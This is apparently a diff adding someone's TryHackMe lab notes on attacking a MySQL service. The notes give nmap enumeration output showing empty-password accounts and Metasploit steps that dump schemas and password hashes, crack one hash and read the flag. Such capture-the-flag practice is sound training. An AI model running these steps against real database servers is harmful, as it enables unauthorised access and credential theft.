@@ -1,0 +1,53 @@
+nmap --script=mysql-enum 10.10.199.112
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 04:47 EDT
+Nmap scan report for 10.10.199.112
+Host is up (0.26s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3306/tcp open  mysql
+| mysql-enum: 
+|   Valid usernames: 
+|     root:<empty> - Valid credentials
+|     guest:<empty> - Valid credentials
+|     user:<empty> - Valid credentials
+|     netadmin:<empty> - Valid credentials
+|     test:<empty> - Valid credentials
+|     web:<empty> - Valid credentials
+|     webadmin:<empty> - Valid credentials
+|     sysadmin:<empty> - Valid credentials
+|     administrator:<empty> - Valid credentials
+|     admin:<empty> - Valid credentials
+|_  Statistics: Performed 10 guesses in 2 seconds, average tps: 5.0
+
+Nmap done: 1 IP address (1 host up) scanned in 42.52 seconds
+
+
+mysql -h [IP] -u [username] -p
+exit
+
+starting metaploits : msfconsole
+
+search mysql_sql -> auxiliary/admin/mysql/mysql_sql
+
+set 3 options : PASSWORD/RHOSTS/USERNAME
+
+set rhosts 10.10.199.112
+set username root
+set password password
+
+run -> 5.7.29-0ubuntu0.18.04.1
+
+set sql show databases -> run -> 4
+
+search mysql_schemadump -> auxiliary/scanner/mysql/mysql_schemadump
+
+set 3 options -> last table name : x$waits_global_by_latency
+
+search mysql_hashdump -> auxiliary/scanner/mysql/mysql_hashdump
+
+get -> carl:*EA031893AA21444B170FC2162A56978B8CEECE18 -> crack -> password : doggie
+
+login -> read file -> get THM{congratulations_you_got_the_mySQL_flag}
+
